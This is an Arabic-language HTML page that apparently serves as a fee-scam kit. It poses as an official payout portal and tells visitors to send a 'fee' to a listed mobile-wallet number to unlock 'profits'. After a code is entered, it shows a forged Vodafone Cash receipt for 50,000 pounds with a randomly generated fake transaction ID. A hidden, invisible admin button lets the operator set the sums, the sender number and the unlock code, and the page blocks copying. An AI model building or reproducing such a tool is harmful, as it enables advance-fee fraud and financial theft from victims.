<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الصرف الرسمية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --blue: #0046af; --red: #e60000; --text-grey: #757575; }
        body { margin: 0; font-family: 'Cairo', sans-serif; background: #f4f4f4; }
        .protected { user-select: none; -webkit-user-select: none; }
        
        /* تصميم الإيصال (image_3.png) */
        .receipt-container { background: #fff; width: 100%; max-width: 400px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .receipt-header { background: #000; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 18px; }
        .success-section { text-align: center; padding: 25px; }
        .check-icon { width: 70px; height: 70px; background: #24b34b; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; font-size: 35px; border: 6px solid #e8f5e9; }
        
        .info-card { background: #fff; border-radius: 12px; margin: 8px 12px; border: 1px solid #eee; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 15px; border-bottom: 1px solid #f9f9f9; align-items: center; }
        .info-label { color: var(--text-grey); font-size: 13px; font-weight: 600; }
        .info-value { font-weight: 900; font-family: 'Arial'; font-size: 16px; color: #000; }
        .info-value-ar { font-weight: 700; font-size: 14px; color: #333; }

        .fees-section { background: #fff; margin: 8px 12px; padding: 15px; border-radius: 12px; border: 1px solid #eee; }
        .fee-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .fee-bold { font-family: 'Arial'; font-weight: 900; font-size: 17px; color: #000; }

        .footer-buttons { display: flex; padding: 15px; gap: 10px; margin-top: auto; padding-bottom: 30px; }
        .btn-share { flex: 2; background: var(--red); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .btn-done { flex: 1; background: #fff; border: 1px solid #ccc; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; }

        /* لوحة التحكم */
        #admin-panel { display:none; position:fixed; inset:0; background:white; z-index:9999; padding:25px; overflow-y: auto; }
        .admin-trigger { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; z-index: 10000; opacity: 0; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .page { display: none; } .active { display: block; }
    </style>
</head>
<body class="protected" id="mainBody">

<div class="admin-trigger" onclick="handleAdminLogin()"></div>

<!-- واجهة العميل الأساسية -->
<div id="home" class="page active">
    <div style="padding: 20px; max-width: 420px; margin: 0 auto;">
        <div style="background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border-top: 5px solid var(--blue);">
            <h2 style="text-align:center; color:var(--blue); margin-bottom:5px;">سحب الأرباح</h2>
            <p style="text-align:center; font-size:12px; color:#666;">برجاء تحويل الرسوم لتفعيل الصرف</p>
            <div style="background:#fff5f5; color:var(--red); padding:15px; text-align:center; border-radius:15px; font-size:24px; font-weight:900; border:2px dashed var(--red); margin:15px 0;" id="f-wallet">01226811784</div>
            <label style="font-size:12px; font-weight:bold;">اسمك بالكامل:</label>
            <input type="text" id="uName" placeholder="أدخل اسمك كما في الهوية">
            <label style="font-size:12px; font-weight:bold;">إرفاق صورة التحويل:</label>
            <input type="file" id="uFile">
            <button onclick="submitReq()" style="width:100%; padding:16px; background:var(--blue); color:white; border:none; border-radius:12px; font-weight:900; font-size:16px; margin-top:10px;">تأكيد التحويل الآن</button>
        </div>
    </div>
</div>

<!-- الإيصال النهائي الاحترافي -->
<div id="final" class="page">
    <div class="receipt-container">
        <div class="receipt-header"><span>✕</span><span>تم بنجاح</span><span>⋮</span></div>
        
        <div class="success-section">
            <div class="check-icon">✓</div>
            <h3 style="margin:0; font-weight:900;">تم التحويل بنجاح</h3>
            <p style="color:var(--text-grey); font-size:14px; margin-top:20px;">مبلغ التحويل</p>
        </div>

        <div class="info-card">
            <div class="info-row">
                <div class="info-label">من</div>
                <div class="info-value" id="res-sender">01044552434</div>
            </div>
            <div class="info-row">
                <div class="info-label">إلى</div>
                <div class="info-value-ar" id="res-receiver">محمد *******</div>
            </div>
        </div>

        <div class="fees-section">
            <div class="fee-row">
                <span class="info-label">الرسوم</span>
                <span class="fee-bold"><span id="res-fees-display">2.49</span> جنيه</span>
            </div>
            <div class="fee-row">
                <span class="info-label">المبلغ الكلي المستحق</span>
                <span class="fee-bold"><span id="res-total-display">50,000.00</span> جنيه</span>
            </div>
        </div>

        <div class="info-card">
            <div class="info-row"><div class="info-label">تاريخ العملية</div><div class="info-value" id="res-date" style="font-size:13px;"></div></div>
            <div class="info-row"><div class="info-label">رقم العملية</div><div class="info-value" id="res-id"></div></div>
        </div>

        <div style="text-align: center; padding: 20px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Vodafone_Cash_Logo.png/640px-Vodafone_Cash_Logo.png" width="70">
        </div>

        <div class="footer-buttons">
            <button class="btn-done" onclick="location.reload()">تم</button>
            <button class="btn-share">شارك ⇮</button>
        </div>
    </div>
</div>

<!-- لوحة التحكم المتطورة -->
<div id="admin-panel">
    <h2 style="color:var(--blue)">إعدادات النظام الذكي</h2>
    <hr>
    <label>رقم المحفظة (الراسل - من):</label>
    <input type="text" id="s-sender">
    
    <label>مبلغ الربح الصافي (الذي سيصله):</label>
    <input type="text" id="s-profit" placeholder="مثال: 50,000.00">
    
    <label>قيمة الرسوم (التي تظهر في الإيصال):</label>
    <input type="text" id="s-fees-val" placeholder="مثال: 2.49">
    
    <label>كود تفعيل الصرف (أعطه للعميل):</label>
    <input type="text" id="s-code">

    <button onclick="saveAdmin()" style="width:100%; padding:15px; background:#28a745; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:20px;">حفظ التعديلات</button>
    <button onclick="location.reload()" style="width:100%; padding:10px; background:#666; color:white; border:none; border-radius:10px; margin-top:10px;">إغلاق</button>
</div>

<script>
    // الإعدادات الافتراضية
    let config = JSON.parse(localStorage.getItem('megaConfig')) || { 
        sender: '01044552434', 
        profit: '50,000.00', 
        fees: '2.49',
        code: '1122' 
    };

    function handleAdminLogin() {
        let p = prompt("كلمة المرور:");
        if(p === "0" || p === "1") {
            if(p === "0") document.getElementById('mainBody').classList.remove('protected');
            document.getElementById('s-sender').value = config.sender;
            document.getElementById('s-profit').value = config.profit;
            document.getElementById('s-fees-val').value = config.fees;
            document.getElementById('s-code').value = config.code;
            document.getElementById('admin-panel').style.display='block';
        }
    }

    function saveAdmin() {
        config = {
            sender: document.getElementById('s-sender').value,
            profit: document.getElementById('s-profit').value,
            fees: document.getElementById('s-fees-val').value,
            code: document.getElementById('s-code').value
        };
        localStorage.setItem('megaConfig', JSON.stringify(config));
        alert("تم الحفظ بنجاح!");
        location.reload();
    }

    function submitReq() {
        let name = document.getElementById('uName').value;
        if(!name) return alert("يرجى إدخال الاسم أولاً");
        
        let c = prompt("طلبك قيد المعالجة.. أدخل كود الصرف :");
        if(c === config.code) {
            // تجهيز بيانات الإيصال
            document.getElementById('res-sender').innerText = config.sender;
            document.getElementById('res-fees-display').innerText = config.fees;
            document.getElementById('res-total-display').innerText = config.profit;
            
            // تشفير الاسم (أول كلمة + نجوم)
            let nameParts = name.split(" ");
            document.getElementById('res-receiver').innerText = nameParts[0] + " " + "********";
            
            // تاريخ حقيقي
            let d = new Date();
            document.getElementById('res-date').innerText = d.toLocaleDateString('en-GB') + " - " + d.toLocaleTimeString('en-GB', {hour:'2-digit', minute:'2-digit'});
            
            // رقم عملية وهمي محترف
            document.getElementById('res-id').innerText = "35" + Math.floor(Math.random() * 900000000 + 100000000);
            
            document.getElementById('home').classList.remove('active');
            document.getElementById('final').classList.add('active');
        } else {
            alert("الكود غير صحيح!");
        }
    }

    document.addEventListener('contextmenu', e => { 
        if(!document.getElementById('mainBody').classList.contains('protected')) return;
        e.preventDefault(); 
    });
</script>
</body>
</html>
